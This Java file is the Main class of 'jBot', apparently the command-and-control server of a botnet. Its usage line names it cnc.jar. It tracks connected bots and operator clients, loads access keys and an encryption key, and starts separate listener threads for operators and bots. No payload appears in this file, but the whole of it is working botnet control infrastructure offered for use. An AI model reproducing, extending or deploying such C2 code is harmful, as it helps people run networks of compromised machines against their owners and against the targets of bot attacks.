package me.aaronakhtar.jbot;

import me.aaronakhtar.jbot.command_manager.JBotCommand;
import me.aaronakhtar.jbot.file_manager.ConfigFile;
import me.aaronakhtar.jbot.file_manager.config_files.DefaultConfigurationFile;
import me.aaronakhtar.jbot.file_manager.files.AccessKeysFile;
import me.aaronakhtar.jbot.objects.Bot;
import me.aaronakhtar.jbot.threads.BotCheckerThread;
import me.aaronakhtar.jbot.threads.DynamicTitleThread;
import me.aaronakhtar.jbot.threads.ShutdownThread;
import me.aaronakhtar.jbot.threads.servers.BotServerThread;
import me.aaronakhtar.jbot.threads.servers.ClientServerThread;
import org.reflections.Reflections;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.net.Socket;
import java.util.*;

public class Main {

    static {
        System.out.println(Utilities.Colour.GREEN.get() + "\nDeveloped by Aaron Akhtar \n\n");  // excuse my promo ;P
    }

    public static final Map<String, Object>         defaultConfig = ConfigFile.getProperties(new DefaultConfigurationFile());
    public static final List<Bot>                   connectedBots = new ArrayList<>();
    public static final Map<Socket, BufferedWriter> connectedClients = new HashMap<>();
    public static volatile boolean                  isRunning = true;                       //todo create 'switch' to modify this value.
    public static final String                      name = "jBot";
    public static final String                      encryptionKey = defaultConfig.get("encryption-key").toString();


    public static final Set<Class<? extends ConfigFile>> configFiles = new Reflections("me.aaronakhtar.jbot.file_manager.files")
            .getSubTypesOf(ConfigFile.class);

    public static final Set<Class<? extends JBotCommand>> commands = new Reflections("me.aaronakhtar.jbot.command_manager.commands")
            .getSubTypesOf(JBotCommand.class);

    public static void main(String[] args) {

        if (args.length != 2){
            Utilities.sendInternalMessage(Utilities.Colour.RED.get() + "Oops! " + Utilities.Colour.RESET.get() + "Please specify the required arguments...");
            System.out.println("'java -jar cnc.jar [cnc-port] [bot-port]'");
            return;
        }
        try {
            final int cncPort = Integer.parseInt(args[0]);
            final int botPort = Integer.parseInt(args[1]);
            for (Class<? extends ConfigFile> configFile : configFiles) {
                try {
                    configFile.newInstance().getFile(); // will create file if it doesn't exist.
                } catch (Exception e) {
                    Utilities.handleException(e);
                }
            }
            Runtime.getRuntime().addShutdownHook(new Thread(new ShutdownThread()));
            Utilities.sendInternalMessage("Fetched ["+AccessKeysFile.getAccessKeys().size()+"] Access-Keys...");
            new ClientServerThread(cncPort).start();
            new BotServerThread(botPort).start();
            new DynamicTitleThread().start();

            new BotCheckerThread().start();

        }catch (Exception e){
            e.printStackTrace();
        }

    }

    public static String getPrefix(){
        return Utilities.Colour.GREEN.get() + "[jBot] " + Utilities.Colour.RESET.get();
    }

}
